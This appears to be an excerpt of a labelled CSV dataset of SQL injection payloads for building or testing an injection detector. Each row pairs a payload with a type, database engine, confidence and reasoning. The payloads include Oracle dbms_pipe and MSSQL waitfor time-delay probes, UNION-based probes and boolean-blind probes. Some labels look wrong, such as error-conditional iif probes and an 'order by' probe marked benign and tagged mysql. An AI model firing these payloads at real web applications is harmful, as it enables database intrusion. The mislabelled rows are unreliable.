id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
24916,"1 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
24920,"1' ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( 'cpoy' = 'cpoy",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
24986,"1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
24805,"iif ( 9875 = 8961,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
24829,waitfor delay '0:0:5' and ( ( 'uvlf' = 'uvlf,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
24832,-6616 ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 20 chars.,2
24838,waitfor delay '0:0:5'#,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
24867,"iif ( 1217 = 8831,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
24875,"1, ( case when 5514 = 9602 then 1 else null end )",benign,generic,0.9,Signals: 'case'. Payload length: 49 chars.,2
24876,"1%"" ) ) ) waitfor delay '0:0:5'--",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
24892,"iif ( 4836 = 1823,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
24968,1' ) ) ) waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
24800,-8878' in boolean mode ) union all select 7785#,union_based,generic,0.7,UNION-based payload detected. Payload length: 47 chars.,2
24802,-2797' ) ) ) union all select 5711#,union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,2
24806,"-7843' where 5986 = 5986 or make_set ( 9354 = 9354,7185 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 60 chars.,2
24807,"-4669' union all select 9387,9387,9387,9387,9387,9387,9387,9387,9387,9387--",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
24809,-7466 where 5161 = 5161 or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 38 chars.,2
